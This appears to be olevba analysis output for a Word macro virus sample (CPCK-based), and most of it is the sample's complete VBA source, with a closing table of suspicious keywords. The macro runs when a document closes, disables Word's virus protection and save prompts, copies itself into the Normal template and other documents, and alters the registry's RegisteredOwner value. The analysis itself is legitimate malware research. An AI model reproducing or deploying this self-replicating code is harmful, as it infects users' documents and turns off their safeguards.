olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-278d38c1b94b28518ad50a86b09e233a65648282
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-278d38c1b94b28518ad50a86b09e233a65648282 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
On Error Resume Next
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Options.ConfirmConversions = 0
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Options.VirusProtection = 0
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
SK5 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Options.SaveNormalPrompt = 0
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
VJ65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Application.EnableCancelKey = 0
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If VJ65 > 0 And SK5 > 0 Then GoTo SO52
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If VJ65 = 0 Then
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Set UQ53 = ActiveDocument.VBProject.VBComponents.Item(1)
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
FQ12 = True
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
End If
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If SK5 = 0 Then
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Set UQ53 = NormalTemplate.VBProject.VBComponents.Item(1)
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
VJ65 = VJ65 + 2
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
LJ4 = True
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "retha"
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
End If
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If LJ4 <> True And FQ12 <> True Then GoTo SO52
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If LJ4 = True Then UQ53.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VJ65 - 1))
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If FQ12 = True Then UQ53.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SK5 - 1))
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
With UQ53.CodeModule
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
For x = 2 To (UQ53.CodeModule.CountOfLines - 1) Step 2
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
Next x
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
End With
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
SO52:
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
If SK5 <> 0 And VJ65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
' ****** ZERTVA was infected 31.03.04 10:36:23
'ZERTVAZvir.docvir.doc31.03.04 10:36:23
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

